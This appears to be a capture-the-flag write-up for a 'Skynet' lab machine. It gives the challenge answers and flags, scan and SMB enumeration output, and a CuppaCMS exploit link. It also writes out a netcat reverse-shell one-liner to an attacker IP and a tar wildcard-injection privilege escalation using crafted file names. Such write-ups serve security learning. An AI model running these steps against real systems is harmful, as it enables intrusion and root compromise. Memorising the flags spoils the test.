# Skynet
##### Question 1: What is Miles password for his emails?
Answer
```bash
cyborg007haloterminator
```

##### Question 2: What is the hidden directory?
Answer
```bash
/45kra24zxs28v3yd
```

##### Question 3: What is the vulnerability called when you can include a remote file for malicious purposes?
Answer
```bash
Remote File Inclusion
```

##### Question 4: User Flag
Answer
```bash
7ce5c2109a40f958099283600a9ae807
```

##### Question 5: Root Flag
Answer
```bash
3f0372db24753accc7179a282cd6a949
```

- - - - - - - - - - - -  - - - - - - - - - - - - - - - - - - - - - 

Nmap Scan:
```bash

Nmap scan report for 10.10.103.131
Host is up (0.11s latency).
Not shown: 65529 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES UIDL TOP SASL AUTH-RESP-CODE CAPA PIPELINING
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: more ENABLE have IMAP4rev1 listed ID capabilities post-login Pre-login OK LITERAL+ LOGINDISABLEDA0001 LOGIN-REFERRALS IDLE SASL-IR
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m51s, median: -1s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)                       
|   Computer name: skynet                  
|   NetBIOS computer name: SKYNET\x00                      
|   Domain name: \x00                           
|   FQDN: skynet                        
|_  System time: 2021-12-19T13:00:35-06:00          
| smb-security-mode:       
|   account_used: guest                                                 
|   authentication_level: user                                                     
|   challenge_response: supported                                                 
|_  message_signing: disabled (dangerous, but default)                             
| smb2-security-mode:                                                 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-12-19T19:00:35
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   35.27 ms  10.6.0.1
2   ... 3
4   104.85 ms 10.10.103.131

```

SMBClient Shows:
```bash

root@kali:~# smbclient -L \\\\10.10.103.131\\
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

```

In anonymous/logs/log1.txt - Password lists

Password from emails:
```bash
)s{A&2Z=F^n_E.B`
```
SMB gives a CMS in /45kra24zxs28v3yd

CuppaCMS exploit: https://www.exploit-db.com/exploits/25971

python -c 'import pty; pty.spawn("/bin/bash")'

Priv Esc:
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.32.32 1221 >/tmp/f' > shell.sh

touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"

touch "/var/www/html/--checkpoint=1"

```

Due to wildcard in the backup.sh file we can run commands via the above way
```bash
www-data@skynet:/$ cat /home/milesdyson/backups/backup.sh 
cat /home/milesdyson/backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```